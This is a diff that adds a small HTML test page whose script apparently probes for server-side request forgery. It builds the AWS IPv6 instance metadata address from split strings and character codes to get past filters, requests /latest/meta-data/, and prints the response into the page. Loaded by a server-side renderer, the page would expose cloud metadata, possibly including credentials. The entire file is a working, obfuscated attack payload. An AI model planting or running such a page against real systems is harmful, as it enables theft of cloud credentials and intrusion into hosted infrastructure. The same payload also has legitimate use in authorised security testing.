@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html>
+<head><title>CharCode Test</title></head>
+<body>
+<h1>CHARCODE_TEST</h1>
+<div id="r1">LOADING</div>
+<script>
+// Construct IP from individual parts
+var a="fd00"; var b="ec2"; var c="254";
+var ip = a+":"+b+"::"+c;
+var proto = String.fromCharCode(104,116,116,112);
+var url = proto + "://[" + ip + "]/latest/meta-data/";
+try {
+  var xhr = new XMLHttpRequest();
+  xhr.open('GET', url, false);
+  xhr.send();
+  document.getElementById('r1').innerText = 'STATUS:' + xhr.status + ' BODY:' + xhr.responseText.substr(0,2000);
+} catch(e) {
+  document.getElementById('r1').innerText = 'ERROR:' + e.name + ':' + e.message;
+}
+</script>
+</body>
+</html>
